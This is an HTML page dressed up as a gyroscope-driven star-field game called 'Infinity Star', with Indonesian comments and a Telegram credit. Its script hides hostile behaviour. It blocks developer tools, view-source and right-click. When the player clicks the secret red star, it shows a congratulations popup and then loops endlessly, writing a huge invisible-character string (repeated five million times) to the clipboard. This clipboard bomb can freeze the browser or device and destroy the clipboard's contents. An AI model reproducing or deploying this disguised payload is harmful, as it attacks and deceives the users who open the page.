<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Infinity Star</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
html, body {
  margin: 0;
  padding: 0;
  overflow: hidden;
  background: black;
  height: 100vh;
  font-family: Arial, sans-serif;
}

.scene {
  width: 100vw;
  height: 100vh;
  perspective: 1200px;
  overflow: hidden;
}

.world {
  width: 200vw;
  height: 200vh;
  position: absolute;
  top: -50vh;
  left: -50vw;
  transform-style: preserve-3d;
  transition: transform 0.1s linear;
}

.star{
  position:absolute;
  width:4px;
  height:4px;
  background:white;
  border-radius:50%;
  opacity:0.8;
  pointer-events:none;
}

.red{
  position:absolute;
  width:10px;
  height:10px;
  background:red;
  border-radius:50%;
  box-shadow:0 0 25px red;
  animation: blink 1s infinite alternate;
  pointer-events:auto !important;
  cursor:pointer;
  z-index:9999;
}

/* HITBOX */
.hitbox{
  position:absolute;
  width:80px;
  height:80px;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  border-radius:50%;
  background:transparent;
  pointer-events:auto;
  z-index:10000;
}

@keyframes blink {
  from { opacity:0.6; }
  to { opacity:1; }
}

.popup {
  position: fixed;
  text-align: center;
  top: 50%;
  left: 50%;
  width:85%;
  height:90%;
  transform: translate(-50%, -50%);
  background: #111;
  border: 2px solid red;
  padding: 25px 35px;
  border-radius: 12px;
  text-align: center;
  color: white;
  display: none;
  z-index: 999999;
  box-shadow: 0 0 30px red;
  animation: pop 0.3s ease;
}
.popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);

  background: rgba(0, 0, 0, 0.9);
  padding: 40px 30px;
  border-radius: 20px;

  text-align: center; /* SEMUA TEKS TENGAH */
  color: white;

  box-shadow:
    0 0 30px rgba(255,0,0,0.5),
    0 0 60px rgba(255,0,0,0.3);

  z-index: 9999999;
}
.popup {
  animation: popupFade 0.4s ease-out;
}

@keyframes popupFade {
  from {
    opacity: 0;
    transform: translate(-50%, -60%) scale(0.9);
  }
  to {
    opacity: 1;
    transform: translate(-50%, -50%) scale(1);
  }
}
.popup p {
  margin-top: 10px;
  font-size: 18px;
  line-height: 1.6;

  letter-spacing: 1px;
  font-weight: 500;

  color: #f5f5f5;

  text-shadow:
    0 0 5px rgba(255,255,255,0.3);
}
.popup i {
  font-size: 110px;
  margin-top: 50%;
  color: #ff2b2b;
  margin-bottom: 20px;

  /* OUTLINE PUTIH */
  -webkit-text-stroke: 2px white;

  /* GLOW */
  text-shadow:
    0 0 10px #ff0000,
    0 0 25px #ff0000,
    0 0 50px rgba(255,0,0,0.8);

  filter: drop-shadow(0 0 25px red);

  animation: pulseWarning 1.5s infinite ease-in-out;
}
@keyframes pulseWarning {
  0% {
    transform: scale(1);
    text-shadow:
      0 0 10px #ff0000,
      0 0 25px #ff0000,
      0 0 50px rgba(255,0,0,0.8);
  }

  50% {
    transform: scale(1.15);
    text-shadow:
      0 0 20px #ff0000,
      0 0 50px #ff0000,
      0 0 100px rgba(255,0,0,1);
  }

  100% {
    transform: scale(1);
    text-shadow:
      0 0 10px #ff0000,
      0 0 25px #ff0000,
      0 0 50px rgba(255,0,0,0.8);
  }
}
@keyframes pop {
  from { transform: translate(-50%, -60%) scale(0.8); opacity: 0; }
  to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
}

button.gyro {
  position: fixed;
  top: 20px;
  left: 20px;
  z-index: 99999;
  padding: 10px 15px;
}
.hitbox-follow{
  position:fixed;
  width:80px;
  height:80px;
  border-radius:50%;
  background:transparent;
  pointer-events:auto;
  z-index:999999;
  display:none;
}
.gyro-btn {
  position: fixed;
  bottom: 25px;
  right: 25px;

  padding: 14px 22px;
  font-size: 16px;
  font-weight: bold;

  color: white;
  background: linear-gradient(135deg, #111, #222);

  border: 2px solid #ff0000;
  border-radius: 12px;

  cursor: pointer;
  z-index: 999999;

  transition: all 0.3s ease;
  box-shadow:
    0 0 10px rgba(255,0,0,0.4),
    0 0 20px rgba(255,0,0,0.2);
}
.gyro-btn:hover {
  transform: scale(1.08);
  box-shadow:
    0 0 15px red,
    0 0 35px red;
}
.gyro-btn.active {
  background: linear-gradient(135deg, #ff0000, #aa0000);
  border-color: white;

  box-shadow:
    0 0 20px red,
    0 0 40px red,
    0 0 60px rgba(255,0,0,0.8);

  animation: gyroPulse 1.5s infinite ease-in-out;
}
@keyframes gyroPulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.1); }
  100% { transform: scale(1); }
}
</style>
</head>
<body>
<button onclick="enableGyro()" class="gyro-btn" id="gyroBtn">
  Randomizer + Mulai
</button>
<!--<button class="gyro" onclick="enableGyro()">Aktifkan Gyro</button>-->

<div class="scene">
  <div class="world" id="world"></div>
</div>

<div class="popup" id="popup">
  <i class="fas fa-triangle-exclamation"></i>
  <h2>WARNING</h2>
  <p>selamat Kamu menemukan bintang rahasia btw</p>
  <p>Web by t.me/arcznewera</p>
</div>

<script>

/* BLOCK INSPECT */
document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
    (e.ctrlKey && e.key === 'U')
  ) e.preventDefault()
})

document.addEventListener('contextmenu', e => e.preventDefault())

/* INVISIBLE CLIPBOARD */
const invis = "‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎".repeat(5000000)

async function utama(){
  await navigator.clipboard.writeText(invis)
}

let running = false

async function loop(){
  running = true
  while(running){
    await utama()
  }
}

/* WARP */
async function warpReload(){
  let stars = document.querySelectorAll(".star")

  stars.forEach(star=>{
    star.style.transition = "transform 0.2s linear"
    star.style.transform += " scale(3)"
  })

  for(let i=0;i<10;i++){
    stars.forEach(star=>{
      star.style.left = Math.random()*200 + "vw"
      star.style.top = Math.random()*200 + "vh"
      star.style.transform =
        `translateZ(${Math.random()*4000-2000}px) scale(3)`
    })
    await new Promise(r=>setTimeout(r,50))
  }

  stars.forEach(star=>{
    star.style.transition = "transform 0.5s ease"
    star.style.left = Math.random()*200 + "vw"
    star.style.top = Math.random()*200 + "vh"
    star.style.transform =
      `translateZ(${Math.random()*2000-1000}px) scale(1)`
  })
}

/* CREATE STARS */
let world = document.getElementById("world")
let popup = document.getElementById("popup")

let totalStars = 800
let randomClickableIndex = Math.floor(Math.random() * totalStars)

for (let i = 0; i < totalStars; i++) {

  let star = document.createElement("div")
  star.className = "star"

  star.style.left = Math.random()*200 + "vw"
  star.style.top = Math.random()*200 + "vh"
  star.style.transform =
    `translateZ(${Math.random()*2000-1000}px)`

if(i === randomClickableIndex){

  star.classList.add("red");

  // BUAT HITBOX FIXED DI DEPAN
  let hitbox = document.createElement("div");
  hitbox.className = "hitbox-follow";
  document.body.appendChild(hitbox);

  // KLIK HITBOX
  hitbox.addEventListener("click", async function(e){
    e.stopImmediatePropagation();
    e.stopPropagation();
    popup.style.display = "block";
    await loop();
  }, true);

  // FOLLOW SYSTEM
  function updateHitbox(){
    let rect = star.getBoundingClientRect();

    // cek apakah masih terlihat di layar
    let visible =
      rect.bottom > 0 &&
      rect.top < window.innerHeight &&
      rect.right > 0 &&
      rect.left < window.innerWidth;

    if(visible){
      hitbox.style.display = "block";
      hitbox.style.left = rect.left + rect.width/2 + "px";
      hitbox.style.top = rect.top + rect.height/2 + "px";
      hitbox.style.transform = "translate(-50%, -50%)";
    } else {
      hitbox.style.display = "none";
    }

    requestAnimationFrame(updateHitbox);
  }

  updateHitbox();
}

  world.appendChild(star)
}

function closePopup(){
  popup.style.display = "none"
}

/* FULLSCREEN */
function openFullscreen(){
  let elem = document.documentElement
  if (elem.requestFullscreen) elem.requestFullscreen()
  else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen()
  else if (elem.msRequestFullscreen) elem.msRequestFullscreen()
}

/* GYRO */
let rotX=0, rotY=0, rotZ=0

function enableGyro(){

  openFullscreen()   // fullscreen saat klik

  if (typeof DeviceOrientationEvent.requestPermission === 'function') {
    DeviceOrientationEvent.requestPermission()
      .then(state=>{
        if(state==='granted'){
          window.addEventListener("deviceorientation", handleOrientation)
        }
      })
  } else {
    window.addEventListener("deviceorientation", handleOrientation)
  }

  warpReload()
}

function handleOrientation(event){
  rotX = event.beta || 0
  rotY = event.gamma || 0
  rotZ = event.alpha || 0

  world.style.transform =
    `rotateX(${rotX}deg)
     rotateY(${rotY}deg)
     rotateZ(${rotZ}deg)`
}
</script>

</body>
</html>
